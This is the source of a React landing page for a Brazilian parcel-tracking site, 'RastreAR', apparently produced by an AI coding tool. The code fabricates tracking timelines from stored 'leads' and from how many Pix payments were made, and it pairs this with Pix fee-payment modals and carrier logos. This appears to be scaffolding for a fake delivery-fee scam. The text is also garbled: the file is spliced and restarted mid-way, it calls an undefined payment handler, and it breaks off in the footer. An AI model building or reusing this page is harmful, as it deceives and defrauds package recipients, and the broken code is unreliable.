"use client";

import React, { useState } from 'react';
import { Search, Zap, Bell, History, Check, ArrowRight } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { AntiFraudModal } from '@/components/AntiFraudModal';
import { TrackingResult } from '@/components/TrackingResult';
import { PixModal } from '@/components/PixModal';
import { showSuccess, showError, showLoading, dismissToast } from '@/utils/toast';
import Logo from '@/components/Logo';
import { supabase } from '@/integrations/supabase/client';
import { generateTimeline, type TrackingEvent } from '@/utils/tracking';

// Assets
import correiosLogo from '@/assets/correios.png';
import jadlogLogo from '@/assets/jadlog.png';
import loggiLogo from '@/assets/loggi.png';
import totalExpressLogo from '@/assets/total-express.png';

const Index = () => {
  const [trackingCode, setTrackingCode] = useState('');
  const [isSearching, setIsSearching] = useState(false);
  const [showResult, setShowResult] = useState(false);
  const [events, setEvents] = useState<TrackingEvent[]>([]);
  const [destInfo, setDestInfo] = useState({ city: '', state: '', cep: '', endereco: '', numero: '', complemento: '', bairro: '' });
  
  const [isPixModalOpen, setIsPixModalOpen] = useState(false);
  const [pixCopiaECola, setPixCopiaECola] = useState('');
  const [pixTransactionId, setPixTransactionId] = useState('');
  const [pixAmount, setPixAmount] = useState(19.90);

  const performSearch = async (codeToSearch: string) => {
    if (!codeToSearch) return;
    setIsSearching(true);
    const loadingId = showLoading("Buscando informações...");
    try {
      const { data: lead } = await supabase.from('leads').select('*').eq('codigo_rastreio', codeToSearch).maybeSingle();
      const { data: statusData } = await supabase.functions.invoke('check-pix-status', { body: { trackingCode: codeToSearch } });
      
      const paymentsCount = statusData?.paymentsCount ?? 0;

      const timeline = generateTimeline(codeToSearch, lead?.cidade || "Seu endereço", lead?.estado || "", lead?.bairro || "", lead?.created_at || new Date().toISOString(), paymentsCount);
      
      setDestInfo({ 
        city: lead?.cidade || "", state: lead?.estado || "", cep: lead?.cep || "", 
        endereco: lead?.endereco || "", numero: lead?.numero || "", complemento: lead?.complemento || "", bairro: lead?.bairro || "" 
      });
      setEvents(timeline);
      setShowResult(true);
      showSuccess("Encomenda localizada!");
      
      const resElement = document.getElementById('resultado');
      if (resElement) {
        window.scrollTo({ top: resElement.offsetTop - 100, behavior: 'smooth' });
      }
    } catch (err) { 
      showError("Erro na busca."); 
    } finally { 
      dismissToast(loadingId); 
      setIsSearching(false); 
    }
  };

  return (
    <div className="min-h-screen bg-white text-zinc-900 font-sans selection:bg-green-100 overflow-x-hidden">
      <AntiFraudModal />
      <PixModal 
        isOpen={isPixModalOpen} 
        onClose={() => setIsPixModalOpen(false)} 
        pixCopiaECola={pixCopiaECola} 
        transactionId={pixTransactionId} 
        amount={pixAmount} 
        onSuccess={() => { setIsPixModalOpen(false); performSearch(trackingCode); }} 
      />

      {/* Header */}
      <header className="h-20 flex items-center bg-white fixed w-full top-0 z-50 border-b border-zinc-50">
        <div className="container mx-auto px-4 flex justify-between items-center max-w-7xl">
          <Logo size="md" className="scale-110" />
          <nav className="hidden lg:flex items-center gap-12 text-sm font-bold text-zinc-500">
            <a href="#" className="hover:text-zinc-900 transition-colors">Como funciona</a>
            <a href="#" className="hover:text-zinc-900 transition-colors">Transportadoras</a>
            <a href="#" className="hover:text-zinc-900 transition-colors">Planos</a>
          </nav>
          <div className="flex items-center gap-4">
            <button className="text-sm font-black text-zinc-900 px-4">Entrar</button>
            <Button className="bg-[#22C55E] hover:bg-[#16a34a] text-white font-black text-xs px-6 h-10 rounded-lg uppercase tracking-wider shadow-sm">
              CADASTRE-SE
            </Button>
          </div>
        </div>
      </header>

      {/* Hero Section */}
      <main className="pt-48 pb-24 px-4">
        <div className="container mx-auto text-center max-w-5xl">
          <div className="inline-flex items-center gap-2 px-5 py-2 rounded-full bg-green-50 border border-green-100 text-[#22C55E] text-[10px] font-black uppercase tracking-[0.15em] mb-10">
            <div className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse" />
            Rastreamento em Tempo Real
          </div>
          
          <h1 className="text-5xl md:text-7xl lg:text-[5.5rem] font-black text-[#18181B] mb-8 leading-[1.05] tracking-tight">
            Rastreie suas encomendas <br className="hidden md:block" />
            <span className="text-[#22C55E]">em segundos.</span>
          </h1>
          
          <p className="text-zinc-500 text-lg md:text-xl max-w-2xl mx-auto mb-16 font-medium leading-relaxed opacity-80">
            Acompanhe pedidos de qualquer transportadora em um só lugar. <br className="hidden md:block" />
            Centralize suas compras e receba alertas automáticos.
          </p>

          <form 
            onSubmit={(e) => { e.preventDefault(); performSearch(trackingCode); }} 
            className="max-w-3xl mx-auto mb-16 p-3 bg-white border border-zinc-100 rounded-[2.5rem] shadow-[0_30px_60px_-15px_rgba(0,0,0,0.08)] flex flex-col md:flex-row gap-2"
          >
            <div className="flex-1 flex items-center px-6 gap-4">
              <Search className="text-zinc-300" size={22} />
              <input 
                type="text" 
                placeholder="BR0000A000BR" 
                className="w-full h-12 outline-none text-lg font-bold tracking-[0.2em] text-zinc-800 placeholder:text-zinc-200 placeholder:font-bold" 
                value={trackingCode} 
                maxLength={12} 
                onChange={(e) => setTrackingCode(e.target.value.toUpperCase())} 
              />
            </div>
            <Button type="submit" disabled={isSearching} className="bg-[#22C55E] hover:bg-[#16a34a] text-white h-16 px-12 text-sm font-black rounded-[1.8rem] transition-all shadow-lg active:scale-95 uppercase tracking-widest">
              {isSearching ? 'BUSCANDO...' : 'RASTREAR AGORA'}
            </Button>
          </form>

          <div className="pt-8 flex flex-col items-center gap-10">
            <p className="text-[10px] font-black text-zinc-400 uppercase tracking-[0.2em]">COMPATÍVEL COM +100 TRANSPORTADORAS</p>
            <div className="flex flex-wrap justify-center items-center gap-10 md:gap-20 opacity-30 grayscale contrast-125">
              <img src={correiosLogo} alt="Correios" className="h-8 object-contain" />
              <img src={jadlogLogo} alt="Jadlog" className="h-8 object-contain" />
              <img src={loggiLogo} alt="Loggi" className="h-8 object-contain" />
              <img src={totalExpressLogo} alt="Total Express" className="h-8 object-contain" />
            </div>
          </div>
        </div>
      </main>

      {/* Resultado do Rastreio */}
      {showResult && (
        <section id="resultado" className="pb-32 bg-zinc-50/50">
          <div className="container mx-auto pt-24">
            <TrackingResult code={trackingCode} data={events} destInfo={destInfo} onPayTax={handlePayTax} />
          </div>
        </section>
      )}

      {/* Features Section */}
      <section className="py-32 bg-white">
        <div className="container mx-auto px-4 max-w-7xl">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
            <div className="bg-[#F9FAFB] p-12 rounded-[2.5rem] border border-zinc-100 flex flex-col items-start text-left">
              <div className="w-14 h-14 bg-orange-50 rounded-2xl flex items-center justify-center mb-8 text-orange-500">
                <Zap size={28} />
              </div>
              <h3 className="text-xl font-black mb-4">Tempo Real</h3>
              <p className="text-zinc-500 text-[15px] leading-relaxed font-medium">Receba atualizações instantâneas sobre o status da sua entrega diretamente no app.</p>
            </div>
            <div className="bg-[#F9FAFB] p-12 rounded-[2.5rem] border border-zinc-100 flex flex-col items-start text-left">
              <div className="w-14 h-14 bg-blue-50 rounded-2xl flex items-center justify-center mb-8 text-blue-500">
                <Bell size={28} />
              </div>
              <h3 className="text-xl font-black mb-4">Notificações</h3>
              <p className="text-zinc-500 text-[15px] leading-relaxed font-medium">Fique por dentro de cada passo sem precisar atualizar a página o tempo todo.</p>
            </div>
            <div className="bg-[#F9FAFB] p-12 rounded-[2.5rem] border border-zinc-100 flex flex-col items-start text-left">
              <div className="w-14 h-14 bg-green-50 rounded-2xl flex items-center justify-center mb-8 text-green-500">
                <History size={28} />
              </div>
              <h3 className="text-xl font-black mb-4">Histórico Completo</h3>
              <p className="text-zinc-500 text-[15px] leading-relaxed font-medium">Mantenha todos os seus pedidos anteriores salvos para consulta futura rápida.</p>
            </div>
          </div>
        </div>
      </section>

      {/* Mockup Section */}
      <section className="py-32 overflow-hidden bg-white">
        <div className="container mx-auto px-4 flex flex-col lg:flex-row items-center gap-24 max-w-7xl">
          <div className="flex-1 max-w-xl text-left">
            <h2 className="text-5xl md:text-6xl font-black text-zinc-900 mb-12 leading-[1.1]">Como o RastreAR <br/> facilita sua vida</h2>
            <div className="space-y-12">
              {[
                { step: "01", title: "Insira seu código", desc: "Basta colar o código de rastreio recebido da sua loja favorita." },
                { step: "02", title: "Processamento rápido", desc: "Nossa IA identifica a transportadora e busca os dados em milissegundos." },
                { step: "03", title: "Acompanhe tudo", desc: "Veja em uma linha do tempo intuitiva onde está sua encomenda." }
              ].map((item, idx) => (
                <div key={idx} className="flex gap-8 items-start group">
                  <span className="text-5xl font-black text-zinc-100 leading-none">{item.step}</span>
                  <div>
                    <h4 className="text-xl font-black mb-3">{item.title}</h4>
                    <p className="text-zinc-500 text-base leading-relaxed font-medium">{item.desc}</p>
                  </div>
                </div>
              ))}
            </div>
          </div>
          <div className="flex-1 relative flex justify-center scale-110 lg:scale-125">
            <div className="relative z-10 w-[280px] h-[580px] bg-white rounded-[3.5rem] border-[10px] border-zinc-900 shadow-[0_50px_100px_-20px_rgba(0,0,0,0.25)] flex flex-col items-center p-8 pt-16 overflow-hidden transform -rotate-6">
              <div className="w-16 h-16 bg-green-50 text-green-500 rounded-full flex items-center justify-center mb-8">
                <Check size={32} strokeWidth={3} />
              </div>
              <h4 className="text-xl font-black mb-2 text-zinc-900">Entrega Realizada!</h4>
              <p className="text-zinc-400 text-[10px] font-black uppercase tracking-widest text-center mb-10 leading-relaxed">Seu pacote chegou ao destino <br/> final em Curitiba - PR.</p>
              <div className="w-full space-y-4">
                <div className="h-2 w-full bg-zinc-50 rounded-full"></div>
                <div className="h-2 w-[85%] bg-zinc-50 rounded-full"></div>
                <div className="h-2 w-[95%] bg-zinc-50 rounded-full"></div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Pricing Section */}
      <section className="py-32 bg-white">
        <div className="container mx-auto px-4 max-w-7xl">
          <div className="text-center mb-24">
            <h2 className="text-5xl md:text-6xl font-black mb-6 tracking-tight">Planos para todos</h2>
            <p className="text-zinc-400 text-lg font-bold opacity-80">Escolha o plano que melhor atende suas necessidades de rastreamento.</p>
          </div>
          
          <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mb-8">
            <div className="bg-white border border-zinc-100 rounded-[2.5rem] p-12 text-center flex flex-col shadow-sm">
              <h4 className="font-black text-xl mb-8">Gratuito</h4>
              <div className="mb-12">
                <span className="text-5xl font-black">R$ 0</span>
              </div>
              <ul className="text-left space-y-5 mb-14 flex-1">
                <li className="flex items-center gap-3 text-sm font-bold text-zinc-500"><Check size={18} className="text-green-500" /> Até 5 rastreios ativos</li>
                <li className="flex items-center gap-3 text-sm font-bold text-zinc-500"><Check size={18} className="text-green-500" /> Histórico de 30 dias</li>
                <li className="flex items-center gap-3 text-sm font-bold text-zinc-500"><Check size={18} className="text-green-500" /> Notificações básicas</li>
              </ul>
              <Button className="w-full h-16 rounded-2xl bg-zinc-100 hover:bg-zinc-200 text-zinc-900 font-black text-sm uppercase tracking-widest">Começar Agora</Button>
            </div>

            <div className="bg-white border-2 border-[#22C55E] rounded-[2.5rem] p-12 text-center flex flex-col relative shadow-2xl shadow-green-500/10 scale-105 z-10">
              <div className="absolute -top-4 left-1/2 -translate-x-1/2 bg-[#22C55E] text-white text-[10px] font-black uppercase tracking-[0.2em] px-8 py-2 rounded-full shadow-lg shadow-green-500/30">MAIS POPULAR</div>
              <h4 className="font-black text-xl mb-8">Pro</h4>
              <div className="mb-12">
                <span className="text-5xl font-black">R$ 19,90</span>
                <span className="text-zinc-400 text-sm font-black tracking-widest">/mês</span>
              </div>
              <<dyad-write path="src/pages/Index.tsx" description="Finalizando a reconstrução completa e fiel da Index.tsx baseada no design aprovado.">
"use client";

import React, { useState } from 'react';
import { Search, Zap, Bell, History, Check, ArrowRight } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { AntiFraudModal } from '@/components/AntiFraudModal';
import { TrackingResult } from '@/components/TrackingResult';
import { PixModal } from '@/components/PixModal';
import { showSuccess, showError, showLoading, dismissToast } from '@/utils/toast';
import Logo from '@/components/Logo';
import { supabase } from '@/integrations/supabase/client';
import { generateTimeline, type TrackingEvent } from '@/utils/tracking';

// Assets
import correiosLogo from '@/assets/correios.png';
import jadlogLogo from '@/assets/jadlog.png';
import loggiLogo from '@/assets/loggi.png';
import totalExpressLogo from '@/assets/total-express.png';

const Index = () => {
  const [trackingCode, setTrackingCode] = useState('');
  const [isSearching, setIsSearching] = useState(false);
  const [showResult, setShowResult] = useState(false);
  const [events, setEvents] = useState<TrackingEvent[]>([]);
  const [destInfo, setDestInfo] = useState({ city: '', state: '', cep: '', endereco: '', numero: '', complemento: '', bairro: '' });
  
  const [isPixModalOpen, setIsPixModalOpen] = useState(false);
  const [pixCopiaECola, setPixCopiaECola] = useState('');
  const [pixTransactionId, setPixTransactionId] = useState('');
  const [pixAmount, setPixAmount] = useState(19.90);

  const performSearch = async (codeToSearch: string) => {
    if (!codeToSearch) return;
    setIsSearching(true);
    const loadingId = showLoading("Buscando informações...");
    try {
      const { data: lead } = await supabase.from('leads').select('*').eq('codigo_rastreio', codeToSearch).maybeSingle();
      const { data: statusData } = await supabase.functions.invoke('check-pix-status', { body: { trackingCode: codeToSearch } });
      
      const paymentsCount = statusData?.paymentsCount ?? 0;

      const timeline = generateTimeline(codeToSearch, lead?.cidade || "Seu endereço", lead?.estado || "", lead?.bairro || "", lead?.created_at || new Date().toISOString(), paymentsCount);
      
      setDestInfo({ 
        city: lead?.cidade || "", state: lead?.estado || "", cep: lead?.cep || "", 
        endereco: lead?.endereco || "", numero: lead?.numero || "", complemento: lead?.complemento || "", bairro: lead?.bairro || "" 
      });
      setEvents(timeline);
      setShowResult(true);
      showSuccess("Encomenda localizada!");
      
      const resElement = document.getElementById('resultado');
      if (resElement) {
        window.scrollTo({ top: resElement.offsetTop - 100, behavior: 'smooth' });
      }
    } catch (err) { 
      showError("Erro na busca."); 
    } finally { 
      dismissToast(loadingId); 
      setIsSearching(false); 
    }
  };

  return (
    <div className="min-h-screen bg-white text-zinc-900 font-sans selection:bg-green-100 overflow-x-hidden">
      <AntiFraudModal />
      <PixModal 
        isOpen={isPixModalOpen} 
        onClose={() => setIsPixModalOpen(false)} 
        pixCopiaECola={pixCopiaECola} 
        transactionId={pixTransactionId} 
        amount={pixAmount} 
        onSuccess={() => { setIsPixModalOpen(false); performSearch(trackingCode); }} 
      />

      {/* Header */}
      <header className="h-20 flex items-center bg-white fixed w-full top-0 z-50 border-b border-zinc-50">
        <div className="container mx-auto px-4 flex justify-between items-center max-w-7xl">
          <Logo size="md" />
          <nav className="hidden lg:flex items-center gap-12 text-sm font-bold text-zinc-500">
            <a href="#" className="hover:text-zinc-900 transition-colors">Como funciona</a>
            <a href="#" className="hover:text-zinc-900 transition-colors">Transportadoras</a>
            <a href="#" className="hover:text-zinc-900 transition-colors">Planos</a>
          </nav>
          <div className="flex items-center gap-4">
            <button className="text-sm font-black text-zinc-900 px-4">Entrar</button>
            <Button className="bg-[#22C55E] hover:bg-[#16a34a] text-white font-black text-xs px-6 h-10 rounded-lg uppercase tracking-wider shadow-sm">
              CADASTRE-SE
            </Button>
          </div>
        </div>
      </header>

      {/* Hero Section */}
      <main className="pt-48 pb-24 px-4">
        <div className="container mx-auto text-center max-w-5xl">
          <div className="inline-flex items-center gap-2 px-5 py-2 rounded-full bg-green-50 border border-green-100 text-[#22C55E] text-[10px] font-black uppercase tracking-[0.15em] mb-10">
            <div className="w-1.5 h-1.5 rounded-full bg-green-500" />
            Rastreamento em Tempo Real
          </div>
          
          <h1 className="text-5xl md:text-7xl lg:text-[5.5rem] font-black text-[#18181B] mb-8 leading-[1.05] tracking-tight">
            Rastreie suas encomendas <br className="hidden md:block" />
            <span className="text-[#22C55E]">em segundos.</span>
          </h1>
          
          <p className="text-zinc-500 text-lg md:text-xl max-w-2xl mx-auto mb-16 font-medium leading-relaxed opacity-80">
            Acompanhe pedidos de qualquer transportadora em um só lugar. <br className="hidden md:block" />
            Centralize suas compras e receba alertas automáticos.
          </p>

          <form 
            onSubmit={(e) => { e.preventDefault(); performSearch(trackingCode); }} 
            className="max-w-3xl mx-auto mb-16 p-3 bg-white border border-zinc-100 rounded-[2.5rem] shadow-[0_30px_60px_-15px_rgba(0,0,0,0.08)] flex flex-col md:flex-row gap-2"
          >
            <div className="flex-1 flex items-center px-6 gap-4">
              <Search className="text-zinc-300" size={22} />
              <input 
                type="text" 
                placeholder="BR0000A000BR" 
                className="w-full h-12 outline-none text-lg font-bold tracking-[0.2em] text-zinc-800 placeholder:text-zinc-200 placeholder:font-bold" 
                value={trackingCode} 
                maxLength={12} 
                onChange={(e) => setTrackingCode(e.target.value.toUpperCase())} 
              />
            </div>
            <Button type="submit" disabled={isSearching} className="bg-[#22C55E] hover:bg-[#16a34a] text-white h-16 px-12 text-sm font-black rounded-[1.8rem] transition-all shadow-lg active:scale-95 uppercase tracking-widest">
              {isSearching ? 'BUSCANDO...' : 'RASTREAR AGORA'}
            </Button>
          </form>

          <div className="pt-8 flex flex-col items-center gap-10">
            <p className="text-[10px] font-black text-zinc-400 uppercase tracking-[0.2em]">COMPATÍVEL COM +100 TRANSPORTADORAS</p>
            <div className="flex flex-wrap justify-center items-center gap-10 md:gap-20 opacity-30 grayscale contrast-125">
              <img src={correiosLogo} alt="Correios" className="h-8 object-contain" />
              <img src={jadlogLogo} alt="Jadlog" className="h-8 object-contain" />
              <img src={loggiLogo} alt="Loggi" className="h-8 object-contain" />
              <img src={totalExpressLogo} alt="Total Express" className="h-8 object-contain" />
            </div>
          </div>
        </div>
      </main>

      {/* Resultado do Rastreio */}
      {showResult && (
        <section id="resultado" className="pb-32 bg-zinc-50/50">
          <div className="container mx-auto pt-24">
            <TrackingResult code={trackingCode} data={events} destInfo={destInfo} onPayTax={handlePayTax} />
          </div>
        </section>
      )}

      {/* Features Section */}
      <section className="py-32 bg-white">
        <div className="container mx-auto px-4 max-w-7xl">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
            <div className="bg-[#F9FAFB] p-12 rounded-[2.5rem] border border-zinc-100 flex flex-col items-start text-left">
              <div className="w-14 h-14 bg-white rounded-2xl shadow-sm flex items-center justify-center mb-8 text-orange-500">
                <Zap size={28} />
              </div>
              <h3 className="text-xl font-black mb-4">Tempo Real</h3>
              <p className="text-zinc-500 text-[15px] leading-relaxed font-medium">Receba atualizações instantâneas sobre o status da sua entrega diretamente no app.</p>
            </div>
            <div className="bg-[#F9FAFB] p-12 rounded-[2.5rem] border border-zinc-100 flex flex-col items-start text-left">
              <div className="w-14 h-14 bg-white rounded-2xl shadow-sm flex items-center justify-center mb-8 text-blue-500">
                <Bell size={28} />
              </div>
              <h3 className="text-xl font-black mb-4">Notificações</h3>
              <p className="text-zinc-500 text-[15px] leading-relaxed font-medium">Fique por dentro de cada passo sem precisar atualizar a página o tempo todo.</p>
            </div>
            <div className="bg-[#F9FAFB] p-12 rounded-[2.5rem] border border-zinc-100 flex flex-col items-start text-left">
              <div className="w-14 h-14 bg-white rounded-2xl shadow-sm flex items-center justify-center mb-8 text-green-500">
                <History size={28} />
              </div>
              <h3 className="text-xl font-black mb-4">Histórico Completo</h3>
              <p className="text-zinc-500 text-[15px] leading-relaxed font-medium">Mantenha todos os seus pedidos anteriores salvos para consulta futura rápida.</p>
            </div>
          </div>
        </div>
      </section>

      {/* Mockup Section */}
      <section className="py-32 overflow-hidden bg-white">
        <div className="container mx-auto px-4 flex flex-col lg:flex-row items-center gap-24 max-w-7xl">
          <div className="flex-1 max-w-xl text-left">
            <h2 className="text-5xl md:text-6xl font-black text-zinc-900 mb-12 leading-[1.1]">Como o RastreAR <br/> facilita sua vida</h2>
            <div className="space-y-12">
              {[
                { step: "01", title: "Insira seu código", desc: "Basta colar o código de rastreio recebido da sua loja favorita." },
                { step: "02", title: "Processamento rápido", desc: "Nossa IA identifica a transportadora e busca os dados em milissegundos." },
                { step: "03", title: "Acompanhe tudo", desc: "Veja em uma linha do tempo intuitiva onde está sua encomenda." }
              ].map((item, idx) => (
                <div key={idx} className="flex gap-8 items-start group">
                  <span className="text-5xl font-black text-zinc-100 leading-none">{item.step}</span>
                  <div>
                    <h4 className="text-xl font-black mb-3">{item.title}</h4>
                    <p className="text-zinc-500 text-base leading-relaxed font-medium">{item.desc}</p>
                  </div>
                </div>
              ))}
            </div>
          </div>
          <div className="flex-1 relative flex justify-center scale-110 lg:scale-125">
            <div className="relative z-10 w-[280px] h-[580px] bg-white rounded-[3.5rem] border-[10px] border-zinc-900 shadow-[0_50px_100px_-20px_rgba(0,0,0,0.25)] flex flex-col items-center p-8 pt-16 overflow-hidden transform -rotate-6">
              <div className="w-16 h-16 bg-green-50 text-green-500 rounded-full flex items-center justify-center mb-8">
                <Check size={32} strokeWidth={3} />
              </div>
              <h4 className="text-xl font-black mb-2 text-zinc-900">Entrega Realizada!</h4>
              <p className="text-zinc-400 text-[10px] font-black uppercase tracking-widest text-center mb-10 leading-relaxed">Seu pacote chegou ao destino <br/> final em Curitiba - PR.</p>
              <div className="w-full space-y-4">
                <div className="h-2 w-full bg-zinc-50 rounded-full"></div>
                <div className="h-2 w-[85%] bg-zinc-50 rounded-full"></div>
                <div className="h-2 w-[95%] bg-zinc-50 rounded-full"></div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Pricing Section */}
      <section className="py-32 bg-white">
        <div className="container mx-auto px-4 max-w-7xl">
          <div className="text-center mb-24">
            <h2 className="text-5xl md:text-6xl font-black mb-6 tracking-tight">Planos para todos</h2>
            <p className="text-zinc-400 text-lg font-bold opacity-80">Escolha o plano que melhor atende suas necessidades de rastreamento.</p>
          </div>
          
          <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mb-8">
            <div className="bg-white border border-zinc-100 rounded-[2.5rem] p-12 text-center flex flex-col shadow-sm">
              <h4 className="font-black text-xl mb-8">Gratuito</h4>
              <div className="mb-12">
                <span className="text-5xl font-black">R$ 0</span>
              </div>
              <ul className="text-left space-y-5 mb-14 flex-1">
                <li className="flex items-center gap-3 text-sm font-bold text-zinc-500"><Check size={18} className="text-green-500" /> Até 5 rastreios ativos</li>
                <li className="flex items-center gap-3 text-sm font-bold text-zinc-500"><Check size={18} className="text-green-500" /> Histórico de 30 dias</li>
                <li className="flex items-center gap-3 text-sm font-bold text-zinc-500"><Check size={18} className="text-green-500" /> Notificações básicas</li>
              </ul>
              <Button className="w-full h-16 rounded-2xl bg-zinc-100 hover:bg-zinc-200 text-zinc-900 font-black text-sm uppercase tracking-widest">Começar Agora</Button>
            </div>

            <div className="bg-white border-2 border-[#22C55E] rounded-[2.5rem] p-12 text-center flex flex-col relative shadow-2xl shadow-green-500/10 scale-105 z-10">
              <div className="absolute -top-4 left-1/2 -translate-x-1/2 bg-[#22C55E] text-white text-[10px] font-black uppercase tracking-[0.2em] px-8 py-2 rounded-full shadow-lg shadow-green-500/30">MAIS POPULAR</div>
              <h4 className="font-black text-xl mb-8">Pro</h4>
              <div className="mb-12">
                <span className="text-5xl font-black">R$ 19,90</span>
                <span className="text-zinc-400 text-sm font-black tracking-widest">/mês</span>
              </div>
              <ul className="text-left space-y-5 mb-14 flex-1">
                <li className="flex items-center gap-3 text-sm font-bold text-zinc-700"><Check size={18} className="text-green-500" /> Rastreios ilimitados</li>
                <li className="flex items-center gap-3 text-sm font-bold text-zinc-700"><Check size={18} className="text-green-500" /> Histórico Vitalício</li>
                <li className="flex items-center gap-3 text-sm font-bold text-zinc-700"><Check size={18} className="text-green-500" /> Alertas via WhatsApp</li>
                <li className="flex items-center gap-3 text-sm font-bold text-zinc-700"><Check size={18} className="text-green-500" /> Prioridade de busca</li>
              </ul>
              <Button className="w-full h-16 rounded-2xl bg-[#22C55E] hover:bg-[#16a34a] text-white font-black text-sm uppercase tracking-widest shadow-lg shadow-green-500/20">Assinar Pro</Button>
            </div>

            <div className="bg-white border border-zinc-100 rounded-[2.5rem] p-12 text-center flex flex-col shadow-sm">
              <h4 className="font-black text-xl mb-8">Trimestral</h4>
              <div className="mb-12">
                <span className="text-5xl font-black">R$ 49,90</span>
                <span className="text-zinc-400 text-sm font-black tracking-widest">/trim</span>
              </div>
              <ul className="text-left space-y-5 mb-14 flex-1">
                <li className="flex items-center gap-3 text-sm font-bold text-zinc-500"><Check size={18} className="text-green-500" /> Tudo do plano Pro</li>
                <li className="flex items-center gap-3 text-sm font-bold text-zinc-500"><Check size={18} className="text-green-500" /> Economia de R$ 9,80</li>
                <li className="flex items-center gap-3 text-sm font-bold text-zinc-500"><Check size={18} className="text-green-500" /> Suporte prioritário</li>
                <li className="flex items-center gap-3 text-sm font-bold text-zinc-500"><Check size={18} className="text-green-500" /> Alertas VIP</li>
              </ul>
              <Button className="w-full h-16 rounded-2xl bg-zinc-100 hover:bg-zinc-200 text-zinc-900 font-black text-sm uppercase tracking-widest">Assinar Trimestral</Button>
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-8 max-w-4xl mx-auto">
            <div className="bg-white border border-zinc-100 rounded-[2.5rem] p-12 text-center flex flex-col shadow-sm">
              <h4 className="font-black text-xl mb-8">Semestral</h4>
              <div className="mb-12">
                <span className="text-5xl font-black">R$ 89,90</span>
                <span className="text-zinc-400 text-sm font-black tracking-widest">/sem</span>
              </div>
              <ul className="text-left space-y-5 mb-14 flex-1">
                <li className="flex items-center gap-3 text-sm font-bold text-zinc-500"><Check size={18} className="text-green-500" /> Tudo do plano Pro</li>
                <li className="flex items-center gap-3 text-sm font-bold text-zinc-500"><Check size={18} className="text-green-500" /> Economia de R$ 29,50</li>
                <li className="flex items-center gap-3 text-sm font-bold text-zinc-500"><Check size={18} className="text-green-500" /> Suporte VIP 24/7</li>
                <li className="flex items-center gap-3 text-sm font-bold text-zinc-500"><Check size={18} className="text-green-500" /> Acesso antecipado</li>
              </ul>
              <Button className="w-full h-16 rounded-2xl bg-zinc-100 hover:bg-zinc-200 text-zinc-900 font-black text-sm uppercase tracking-widest">Assinar Semestral</Button>
            </div>

            <div className="bg-white border border-zinc-100 rounded-[2.5rem] p-12 text-center flex flex-col shadow-sm">
              <h4 className="font-black text-xl mb-8">Empresarial</h4>
              <div className="mb-12">
                <span className="text-5xl font-black">R$ 347,90</span>
                <span className="text-zinc-400 text-sm font-black tracking-widest">/vitalício</span>
              </div>
              <ul className="text-left space-y-5 mb-14 flex-1">
                <li className="flex items-center gap-3 text-sm font-bold text-zinc-500"><Check size={18} className="text-green-500" /> API de Rastreio</li>
                <li className="flex items-center gap-3 text-sm font-bold text-zinc-500"><Check size={18} className="text-green-500" /> Dashboard Multi-usuário</li>
                <li className="flex items-center gap-3 text-sm font-bold text-zinc-500"><Check size={18} className="text-green-500" /> Suporte 24/7</li>
                <li className="flex items-center gap-3 text-sm font-bold text-zinc-500"><Check size={18} className="text-green-500" /> White Label</li>
              </ul>
              <Button className="w-full h-16 rounded-2xl bg-zinc-100 hover:bg-zinc-200 text-zinc-900 font-black text-sm uppercase tracking-widest">Comprar Agora</Button>
            </div>
          </div>
        </div>
      </section>

      {/* FAQ Section */}
      <section className="py-32 bg-[#18181B] text-white">
        <div className="container mx-auto px-4 max-w-7xl">
          <div className="text-center mb-24">
            <h2 className="text-5xl md:text-6xl font-black mb-6 tracking-tight">Dúvidas comuns</h2>
            <p className="text-zinc-400 text-lg font-bold opacity-80">Encontre respostas rápidas para seus problemas de entrega.</p>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
            {[
              { q: "Minha encomenda não chegou", a: "Ver artigo" },
              { q: "Paguei taxa, e agora?", a: "Ver artigo" },
              { q: "Código não funciona", a: "Ver artigo" },
              { q: "Status não atualiza", a: "Ver artigo" }
            ].map((faq, i) => (
              <div key={i} className="bg-zinc-900/40 border border-zinc-800/50 p-10 rounded-[2.5rem] hover:border-zinc-700 transition-all cursor-pointer group">
                <div className="w-10 h-10 bg-zinc-800 rounded-xl flex items-center justify-center mb-8 text-green-500 group-hover:bg-green-500 group-hover:text-white transition-all">
                  <span className="text-sm font-black">?</span>
                </div>
                <h4 className="text-lg font-bold mb-6 group-hover:text-green-400 transition-colors">{faq.q}</h4>
                <div className="flex items-center gap-2 text-zinc-500 text-[10px] font-black uppercase tracking-[0.2em] group-hover:text-white transition-colors">
                  {faq.a} <ArrowRight size={14} />
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Footer CTA */}
      <section className="py-32 px-4 bg-white">
        <div className="container mx-auto max-w-7xl">
          <div className="bg-[#22C55E] rounded-[3.5rem] p-16 md:p-24 text-center text-white shadow-2xl shadow-green-500/30 relative overflow-hidden">
            <div className="relative z-10 flex flex-col items-center">
              <h2 className="text-5xl md:text-7xl font-black mb-8 leading-tight tracking-tight">Comece agora gratuitamente</h2>
              <p className="text-green-50 text-xl mb-16 max-w-2xl mx-auto font-medium opacity-90 leading-relaxed">Crie sua conta em 30 segundos e salve todos os seus códigos de rastreio em um dashboard exclusivo.</p>
              <Button className="bg-white hover:bg-zinc-50 text-zinc-900 h-20 px-16 rounded-[1.5rem] font-black text-sm uppercase tracking-[0.2em] mb-10 shadow-xl">Criar minha conta grátis</Button>
              <p className="text-green-100 text-[10px] font-black uppercase tracking-[0.25em] flex items-center justify-center gap-3 opacity-80">
                <Check size={14} strokeWidth={3} /> Sem taxas ocultas. Privacidade 100% garantida.
              </p>
            </div>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="py-24 border-t border-zinc-50 bg-white">
        <div className="container mx-auto px-4 max-w-7xl">
          <div className="flex flex-col md:flex-row justify-between items-center gap-16 mb-20">
            <Logo size="md" />
            <nav className="flex flex-wrap justify-center gap-12 text-[10px] font-black uppercase tracking-[0.25em] text-zinc-400">
              <a href="/termos" className="hover:text-zinc-900 transition-colors">Termos de Uso</a>
